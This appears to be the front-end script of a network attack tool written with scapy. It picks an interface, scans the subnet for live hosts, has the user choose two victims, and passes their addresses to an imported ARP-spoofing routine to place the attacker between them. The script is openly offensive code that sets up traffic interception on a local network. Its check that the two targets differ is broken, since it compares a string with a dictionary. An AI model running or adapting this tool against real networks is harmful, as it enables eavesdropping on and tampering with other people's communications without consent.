from scapy.all import *
import netifaces as ni
import arp_spoofing as arp
import search_hosts as sh

default_iface = "lo"

def main():
    conf.verb = 0

    iface = get_interface()

    print("Searching for active hosts in the subnet...")
    active_hosts = sh.search_hosts(iface)

    print("\nInput IP address of the first target out of the active hosts:")
    first_target = validate_ip(active_hosts, "")
    
    print("\nInput IP address of the second target out of the active hosts:")
    second_target = validate_ip(active_hosts, first_target)

    my_details = sh.get_my_details(iface)
    arp.arp_spoofing(first_target["mac"], first_target["ip"], second_target["mac"], second_target["ip"], my_details["mac"], my_details["ip"], iface)
    

def get_interface():
    # get available interfaces
    interfaces = get_if_list()

    # remove loopback interface (used to communicate with itself) if available
    try: 
        interfaces.remove("lo")
    except: 
        pass

    # set default interface
    try: 
        iface = ni.gateways()["default"][2][1]
    except:
        iface = default_iface

    # choose interface
    try:
        print("\nAvailable interfaces:")
        for i in range(len(interfaces)):
            print("\t"+str(i+1) + ": " + interfaces[i])
        print("\nChoose interface("+str(1)+"-"+str(len(interfaces))+") or default('d'):")

        user_input = input()
        if user_input not in ["default","Default","d","D"]:
            iface = interfaces[int(user_input)-1]
        print("Chosen interface: " + iface + "\n")
    except:
        print("Invalid input. Choosing default interface ({}).".format(iface))

    return iface
    

def validate_ip(active_hosts, other_ip):
    ip_is_valid = False
    curr_ip = input()
    correct_tuple = {}

    for host in active_hosts:
        if (str(host["ip"]) == curr_ip):
            correct_tuple = host
            ip_is_valid = True
            break

    if (curr_ip == other_ip):
        print("The second target cannot be the same as the first. Try again:")
        return validate_ip(active_hosts, other_ip)
    elif (ip_is_valid == True):
        return correct_tuple
    else:
        print("Invalid IP. Try again:")
        return validate_ip(active_hosts, other_ip)

# call main
if __name__=="__main__":
    main()